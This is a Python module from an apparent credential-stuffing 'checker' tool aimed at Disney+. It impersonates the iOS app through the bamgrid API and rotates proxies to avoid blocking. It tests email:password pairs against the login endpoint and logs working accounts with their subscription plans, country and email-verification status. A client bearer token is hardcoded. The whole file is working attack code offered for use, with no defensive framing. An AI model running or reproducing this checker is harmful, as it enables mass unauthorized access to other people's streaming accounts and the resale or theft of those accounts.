from time import sleep
from modules.variables import Checker
from modules.functions import return_proxy, set_proxy,log,save,bad_proxy
from requests import Session
from random import choices
from string import ascii_letters,digits
from datetime import datetime
from json import loads
from requests.adapters import HTTPAdapter, Retry
import functools

def item_generator(json_input, lookup_key):
    if isinstance(json_input, dict):
        for k, v in json_input.items():
            if k == lookup_key:
                yield v
            else:
                yield from item_generator(v, lookup_key)
    elif isinstance(json_input, list):
        for item in json_input:
            yield from item_generator(item, lookup_key)

def check(email:str,password:str):
    while 1:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {"deviceFamily":"application","applicationRuntime":"iPhone7,2","deviceProfile":"iPhone7,2","attributes":{}}
                headers = {
                    "Host": "global.edge.bamgrid.com" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "Accept": "application/json" ,
                    "Content-Type": "application/json",
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "Authorization": "Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" ,
                    "X-BAMSDK-Transaction-ID": "38352459-B3B6-4B40-BEA5-DF106B4A4020" ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "gzip, deflate" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1" ,
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Connection": "close",
                }
                r = s.post('https://global.edge.bamgrid.com/devices',json=payload,headers=headers)
                if r.status_code == 403: raise

                token = r.json()['assertion']
                payload = f"platform=iphone&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token={token}&subject_token_type=urn:bamtech:params:oauth:token-type:device"
                headers = {
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Pragma": "no-cache" ,
                    "Accept": "application/json" ,
                    "Host": "global.edge.bamgrid.com" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "Authorization": "Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" ,
                    "X-BAMSDK-Transaction-ID": "38352459-B3B6-4B40-BEA5-DF106B4A4020" ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "gzip, deflate" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1" ,
                    "Connection": "close" ,
                    "Content-Type":"application/x-www-form-urlencoded"
                }
                r = s.post('https://global.edge.bamgrid.com/token',data=payload,headers=headers)
                if 'unauthorized_client' in r.text or 'invalid-token' in r.text: raise
                
                auth_token = r.json()['access_token']
                headers = {
                    "Host": "global.edge.bamgrid.com" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "Accept": "application/json; charset=utf-8" ,
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "Authorization": f"Bearer {auth_token}" ,
                    "X-BAMSDK-Transaction-ID": "B60EB6F9-C59D-4037-827A-6D1E9B707F69" ,
                    "Accept-Language": "en-us" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1" ,
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Connection": "keep-alive" ,
                    "Content-Type": "application/json",
                }
                payload = {'email':email,'password':password}
                r = s.post('https://global.edge.bamgrid.com/idp/login',json=payload,headers=headers)
                if 'Bad credentials sent for' in r.text or 'is not a valid email Address at /email' in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if 'token' not in r.text:
                    raise
                
                id_token = r.json()['id_token']
                payload = {'id_token':id_token}
                headers = {
                    "Host": "global.edge.bamgrid.com" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "Accept": "application/json; charset=utf-8" ,
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "Authorization": f"Bearer {auth_token}" ,
                    "X-BAMSDK-Transaction-ID": "B60EB6F9-C59D-4037-827A-6D1E9B707F69" ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "br, gzip, deflate" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1" ,
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Connection": "keep-alive" ,
                    "Content-Type": "application/json",
                }
                r = s.post('https://global.edge.bamgrid.com/accounts/grant',json=payload,headers=headers)

                assertion = r.json()['assertion']
                payload = f"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn:bamtech:params:oauth:token-type:account" 
                headers = {
                    "Host": "global.edge.bamgrid.com" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "Accept": "application/json" ,
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "Authorization": "Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" ,
                    "X-BAMSDK-Transaction-ID": "38352459-B3B6-4B40-BEA5-DF106B4A4020" ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "gzip, deflate" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=1" ,
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Connection": "close" ,
                    "Content-Type":"application/x-www-form-urlencoded"
                }
                r = s.post("https://global.edge.bamgrid.com/token",data=payload,headers=headers)

                access_token = r.json()['access_token']
                headers = {
                    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0" ,
                    "Pragma": "no-cache" ,
                    "Accept": "application/json" ,
                    "X-BAMSDK-Platform": "iPhone7,2" ,
                    "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
                    "authorization": f"Bearer {access_token}" ,
                    "X-BAMSDK-Version": "9.9.2" ,
                }
                subs = s.get('https://global.edge.bamgrid.com/subscriptions',headers=headers)
                if subs.text == '[]':
                    if not Checker.cui: log("custom",":".join([email,password]),"Disney")
                    save("Disney","custom",Checker.time,":".join([email,password]))
                    return_proxy(proxy)
                    Checker.custom += 1
                    return
                r = s.get('https://global.edge.bamgrid.com/accounts/me',headers=headers)

                plans = [plan for plan in item_generator(subs.json(), 'name')]
                verified = r.text.split('emailVerified":')[1].split(',')[0]
                country = r.text.split('country":"')[1].split('"')[0]

                if not Checker.cui: log("good",":".join([email,password]),"Disney")
                save("Disney","good",Checker.time,":".join([email,password])+f" | Verified: {verified} | Country: {country} | Plans: {plans}")
                return_proxy(proxy)
                Checker.good += 1
                return
        except:
            return_proxy(proxy)
            bad_proxy(proxy)
            Checker.errors += 1
        
        sleep(0.1)